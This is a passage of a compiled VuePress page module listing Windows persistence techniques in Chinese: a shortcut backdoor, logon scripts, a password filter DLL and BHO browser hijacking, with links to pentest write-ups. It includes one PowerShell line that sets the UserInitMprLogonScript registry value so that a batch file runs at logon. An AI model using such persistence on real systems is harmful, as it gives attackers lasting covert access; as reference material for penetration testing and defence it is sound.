noreferrer"},tt=t('\u300A\u6E17\u900F\u6280\u5DE7\u2014\u2014"\u9690\u85CF"\u6CE8\u518C\u8868\u7684\u521B\u5EFA\u300B'),nt={href:"https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/",target:"_blank",rel:"noopener noreferrer"},it=t('\u300A\u6E17\u900F\u6280\u5DE7\u2014\u2014"\u9690\u85CF"\u6CE8\u518C\u8868\u7684\u66F4\u591A\u6D4B\u8BD5\u300B'),st=e("h5",{id:"_28\u3001\u5FEB\u6377\u65B9\u5F0F\u540E\u95E8",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_28\u3001\u5FEB\u6377\u65B9\u5F0F\u540E\u95E8","aria-hidden":"true"},"#"),t(" 28\u3001\u5FEB\u6377\u65B9\u5F0F\u540E\u95E8")],-1),rt=e("p",null,"\u66FF\u6362\u6211\u7684\u7535\u8111\u5FEB\u6377\u65B9\u5F0F\u542F\u52A8\u53C2\u6570 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1",-1),at={id:"_29\u3001logon-scripts",tabindex:"-1"},ot=e("a",{class:"header-anchor",href:"#_29\u3001logon-scripts","aria-hidden":"true"},"#",-1),dt=t(" 29\u3001"),lt={href:"https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/",target:"_blank",rel:"noopener noreferrer"},ct=t("Logon Scripts"),ut=e("div",{class:"language-text ext-text line-numbers-mode"},[e("pre",{class:"language-text"},[e("code",null,`New-ItemProperty "HKCU:\\Environment\\" UserInitMprLogonScript -value "c:\\test\\11.bat" -propertyType string | Out-Null
`)]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1),ht={id:"_30\u3001password-filter-dll",tabindex:"-1"},_t=e("a",{class:"header-anchor",href:"#_30\u3001password-filter-dll","aria-hidden":"true"},"#",-1),mt=t(" 30\u3001"),vt={href:"https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/",target:"_blank",rel:"noopener noreferrer"},bt=t("Password Filter DLL"),pt={id:"_31\u3001\u5229\u7528bho\u5B9E\u73B0ie\u6D4F\u89C8\u5668\u52AB\u6301",tabindex:"-1"},gt=e("a",{class:"header-anchor",href:"#_31\u3001\u5229\u7528bho\u5B9E\u73B0ie\u6D4F\u89C8\u5668\u52AB\u6301","aria-hidden":"true"},"#",-1),Et=t(" 31\u3001"),xt={href:"https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/",target:"_blank",rel:"noopener noreferrer"},ft=t("\u5229\u7528BHO\u5B9E\u73B0IE\u6D4F\u89C8\u5668\u52AB\u6301");function Ct(At,St){const n=a("ExternalLinkIcon");return o(),d("div",null,[c,e("h5",u,[h,_,e("a",m,[v,i(n)])]),b,e("h5",p,[g,E,e("a",x,[f,i(n)])]),C,e("h5",A,[S,w,e("a",L,[k,i(n)])]),B,e("h5",q,[y,P,e("a",O,[W,i(n)])]),N,e("h5",M,[T,F,e("a",H,[I,i(n)])]),R,D,U,e("h5",V,[j,K,e("a",$,[Y,i(n)])]),Q,e("h5",X,[G,J,e("a",z,[Z,i(n)])]),ee,e("h5",te,[ne,ie,e("a",se,[re,i(n)])]),ae,e("h5",oe,[de,le,e("a",ce,[ue,i(n)])]),he,e("h5",_e,[me,ve,e("a",be,[pe,i(n)])]),ge,Ee,e("p",null,[e("a",xe,[fe,i(n)]),Ce,e("a",Ae,[Se,i(n)]),e("a",we,[Le,i(n)])]),ke,Be,e("h5",qe,[ye,Pe,e("a",Oe,[We,i(n)])]),Ne,e("h5",Me,[Te,Fe,e("a",He,[Ie,i(n)])]),Re,e("h5",De,[Ue,Ve,e("a",je,[Ke,i(n)])]),$e,e("h5",Ye,[Qe,Xe,e("a",Ge,[Je,i(n)])]),ze,e("p",null,[Ze,e("a",et,[tt,i(n)]),e("a",nt,[it,i(n)])]),st,rt,e("h5",at,[ot,dt,e("a",lt,[ct,i(n)])]),ut,e("h5",ht,[_t,mt,e("a",vt,[bt,i(n)])]),e("h5",pt,[gt,Et,e("a",xt,[ft,i(n)])])])}const Lt=r(l,[["render",Ct],["__file","windows-sec-setting.html.vue"]]);export{Lt as default};
